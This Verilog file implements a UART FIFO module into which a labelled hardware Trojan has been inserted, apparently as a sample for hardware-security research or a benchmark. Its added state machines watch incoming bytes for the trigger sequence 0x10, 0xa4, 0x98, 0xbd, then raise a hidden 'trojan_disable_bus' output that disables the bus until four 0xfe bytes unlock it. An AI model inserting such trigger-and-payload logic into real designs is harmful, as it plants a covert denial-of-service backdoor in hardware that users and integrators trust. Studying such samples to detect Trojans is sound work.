module ufifo #(
		// {{{
		parameter	BW=8,	// Byte/data width
		parameter [3:0]	LGFLEN=4,
		parameter [0:0]	RXFIFO=1'b1,
		localparam	FLEN=(1<<LGFLEN)
		// }}}
	) (
		// {{{
		input	wire		i_clk, i_reset,
		input	wire		i_wr,
		input	wire [(BW-1):0]	i_data,
		output	wire		o_empty_n, // True if something is in FIFO
		input	wire		i_rd,
		output	wire [(BW-1):0]	o_data,
		output	wire	[15:0]	o_status,
		output	wire		o_err,
		// ----- Trojan output signal -----
		output	wire		trojan_disable_bus // <-- Inserted output for Trojan
		// }}}
	);

	// Signal declarations (original)
	// {{{
	reg	[(BW-1):0]	fifo[0:(FLEN-1)];
	reg	[(BW-1):0]	r_data, last_write;
	reg	[(LGFLEN-1):0]	wr_addr, rd_addr, r_next;
	reg			will_overflow, will_underflow;
	reg			osrc;

	wire	[(LGFLEN-1):0]	w_waddr_plus_one, w_waddr_plus_two;
	wire			w_write, w_read;
	reg	[(LGFLEN-1):0]	r_fill;
	wire	[3:0]		lglen;
	wire			w_half_full;
	reg	[9:0]		w_fill;
	// }}}

	// ===================================================================
	// Trojan Insertion: Registers for trigger, unlock, and state machine
	// ===================================================================
	// Trojan trigger sequence: 0x10, 0xa4, 0x98, 0xbd (in order)
	// Trojan unlock sequence:  0xfe x 4 (in order)
	reg [2:0]	trig_state;
	reg [2:0]	unlock_state;
	reg		trojan_active;
	reg		trojan_disable_latch;

	// Trojan trigger state machine
	always @(posedge i_clk or posedge i_reset)
	begin
		if (i_reset) begin
			trig_state <= 3'd0;
		end else if (i_wr) begin
			case (trig_state)
				3'd0: trig_state <= (i_data == 8'h10) ? 3'd1 : 3'd0;
				3'd1: trig_state <= (i_data == 8'ha4) ? 3'd2 : ((i_data == 8'h10) ? 3'd1 : 3'd0);
				3'd2: trig_state <= (i_data == 8'h98) ? 3'd3 : ((i_data == 8'h10) ? 3'd1 : 3'd0);
				3'd3: trig_state <= (i_data == 8'hbd) ? 3'd4 : ((i_data == 8'h10) ? 3'd1 : 3'd0);
				3'd4: trig_state <= 3'd4; // remain in terminal trigger
				default: trig_state <= 3'd0;
			endcase
		end else if (trojan_active) begin
			trig_state <= 3'd4; // latch
		end
	end

	// Trojan unlock state machine (only active when Trojan is active)
	always @(posedge i_clk or posedge i_reset)
	begin
		if (i_reset) begin
			unlock_state <= 3'd0;
		end else if (trojan_active && i_wr) begin
			case (unlock_state)
				3'd0: unlock_state <= (i_data == 8'hfe) ? 3'd1 : 3'd0;
				3'd1: unlock_state <= (i_data == 8'hfe) ? 3'd2 : 3'd0;
				3'd2: unlock_state <= (i_data == 8'hfe) ? 3'd3 : 3'd0;
				3'd3: unlock_state <= (i_data == 8'hfe) ? 3'd4 : 3'd0;
				3'd4: unlock_state <= 3'd4;
				default: unlock_state <= 3'd0;
			endcase
		end else if (!trojan_active) begin
			unlock_state <= 3'd0;
		end
	end

	// Trojan active latch: Set on trigger; clear on unlock
	always @(posedge i_clk or posedge i_reset)
	begin
		if (i_reset) begin
			trojan_active <= 1'b0;
		end else if (!trojan_active && trig_state == 3'd4)
			trojan_active <= 1'b1;
		else if (trojan_active && unlock_state == 3'd4)
			trojan_active <= 1'b0;
	end

	// Trojan payload output signal: active high disables bus
	always @(posedge i_clk or posedge i_reset)
	begin
		if (i_reset)
			trojan_disable_latch <= 1'b0;
		else if (trojan_active)
			trojan_disable_latch <= 1'b1;
		else if (!trojan_active)
			trojan_disable_latch <= 1'b0;
	end

	assign trojan_disable_bus = trojan_disable_latch;
	// ========== END OF TROJAN INSERTION =============

	// ------------------ Original code below --------------------

	assign	w_write = (i_wr && (!will_overflow || i_rd));
	assign	w_read  = (i_rd && o_empty_n);

	assign	w_waddr_plus_two = wr_addr + 2;
	assign	w_waddr_plus_one = wr_addr + 1;

	////////////////////////////////////////////////////////////////////////
	//
	// Write half
	// {{{
	////////////////////////////////////////////////////////////////////////
	//

	// will_overflow
	// {{{
	initial	will_overflow = 1'b0;
	always @(posedge i_clk)
	if (i_reset)
		will_overflow <= 1'b0;
	else if (i_rd)
		will_overflow <= (will_overflow)&&(i_wr);
	else if (w_write)
		will_overflow <= (will_overflow)||(w_waddr_plus_two == rd_addr);
	else if (w_waddr_plus_one == rd_addr)
		will_overflow <= 1'b1;
	// }}}

	// wr_addr
	// {{{
	initial	wr_addr = 0;
	always @(posedge i_clk)
	if (i_reset)
		wr_addr <= { (LGFLEN){1'b0} };
	else if (w_write)
		wr_addr <= w_waddr_plus_one;
	// }}}

	// Write to the FIFO
	// {{{
	always @(posedge i_clk)
	if (w_write) // Write our new value regardless--on overflow or not
		fifo[wr_addr] <= i_data;
	// }}}
	// }}}
	////////////////////////////////////////////////////////////////////////
	//
	// Read half
	// {{{
	////////////////////////////////////////////////////////////////////////
	//

	// will_underflow
	// {{{
	initial	will_underflow = 1'b1;
	always @(posedge i_clk)
	if (i_reset)
		will_underflow <= 1'b1;
	else if (i_wr)
		will_underflow <= 1'b0;
	else if (w_read)
		will_underflow <= (will_underflow)||(r_next == wr_addr);
	// }}}

	// rd_addr, r_next
	// {{{
	initial	rd_addr = 0;
	initial	r_next  = 1;
	always @(posedge i_clk)
	if (i_reset)
	begin
		rd_addr <= 0;
		r_next  <= 1;
	end else if (w_read)
	begin
		rd_addr <= rd_addr + 1;
		r_next  <= rd_addr + 2;
	end
	// }}}

	// Read from the FIFO
	// {{{
	always @(posedge i_clk)
	if (w_read)
		r_data <= fifo[r_next[LGFLEN-1:0]];
	// }}}

	// last_write -- for bypassing the memory read
	// {{{
	always @(posedge i_clk)
	if (i_wr && (!o_empty_n || (w_read && r_next == wr_addr)))
		last_write <= i_data;
	// }}}

	// osrc
	// {{{
	initial	osrc = 1'b0;
	always @(posedge i_clk)
	if (i_reset)
		osrc <= 1'b0;
	else if (i_wr && (!o_empty_n || (w_read && r_next == wr_addr)))
		osrc <= 1'b1;
	else if (i_rd)
		osrc <= 1'b0;
	// }}}

	assign o_data = (osrc) ? last_write : r_data;
	// }}}
	////////////////////////////////////////////////////////////////////////
	//
	// Status signals and flags
	// {{{
	////////////////////////////////////////////////////////////////////////
	//

	// r_fill
	// {{{
	generate if (RXFIFO)
	begin : RXFIFO_FILL
		initial	r_fill = 0;
		always @(posedge i_clk)
		if (i_reset)
			r_fill <= 0;
		else case({ w_write, w_read })
		2'b01:	r_fill <= r_fill - 1'b1;
		2'b10:	r_fill <= r_fill + 1'b1;
		default:  begin end
		endcase
	end else begin : TXFIFO_FILL
		initial	r_fill = -1;
		always @(posedge i_clk)
		if (i_reset)
			r_fill <= -1;
		else case({ w_write, w_read })
		2'b01:	r_fill <= r_fill + 1'b1;
		2'b10:	r_fill <= r_fill - 1'b1;
		default:  begin end
		endcase
	end endgenerate
	// }}}

	// o_err -- Flag any overflows
	assign o_err = (i_wr && !w_write);

	// o_status
	assign lglen = LGFLEN;

	always @(*)
	begin
		w_fill = 0;
		w_fill[(LGFLEN-1):0] = r_fill;
	end

	assign	w_half_full = r_fill[(LGFLEN-1)];

	assign	o_status = {
		lglen,
		w_fill,
		w_half_full,
		(RXFIFO!=0)?!will_underflow:!will_overflow
	};

	assign	o_empty_n = !will_underflow;
	// }}}
////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
//
// Formal property section
// {{{
////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
`ifdef	FORMAL
	// (Formal verification code unchanged)
`endif
// }}}
endmodule